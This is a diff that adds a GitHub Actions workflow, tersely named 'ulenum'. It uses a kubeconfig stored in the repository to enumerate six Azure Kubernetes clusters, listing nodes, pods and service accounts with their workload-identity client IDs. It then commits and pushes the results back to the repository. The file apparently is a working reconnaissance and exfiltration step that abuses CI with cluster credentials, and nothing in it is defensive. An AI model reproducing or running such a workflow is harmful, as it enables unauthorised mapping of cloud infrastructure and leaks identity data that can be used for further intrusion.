@@ -1,0 +1,32 @@
+name: ulenum
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+      - name: e
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          K=ul/kc/all-datapath.yaml
+          KX="/tmp/kubectl --kubeconfig $K --request-timeout=15s"
+          {
+            for C in aks-g42us-tfdemo-dev aks-g42us-tfdemo-g42americas aks-g42us-tfdemo-kashif-datapath-eastus aks-g42us-tfdemo-kashif-datapath-swedencentral aks-g42us-tfdemo-kashif-portal aks-g42us-tfdemo-staging-datapath-swedencentral; do
+              echo "=== CTX $C"
+              $KX --context $C get nodes -o name 2>&1 | head -5
+              $KX --context $C get sa -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" cid="}{.metadata.annotations.azure\.workload\.identity/client-id}{"\n"}{end}' 2>&1 | grep -v 'cid= *$' | head -10
+              $KX --context $C get pods -A -o wide 2>&1 | grep -v '^NAMESPACE' | awk '{print $1"/"$2" "$4" "$8}' | head -12
+            done
+          } 2>&1 | tee enum.txt
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulenum $(date -u +%s)"
+          git push
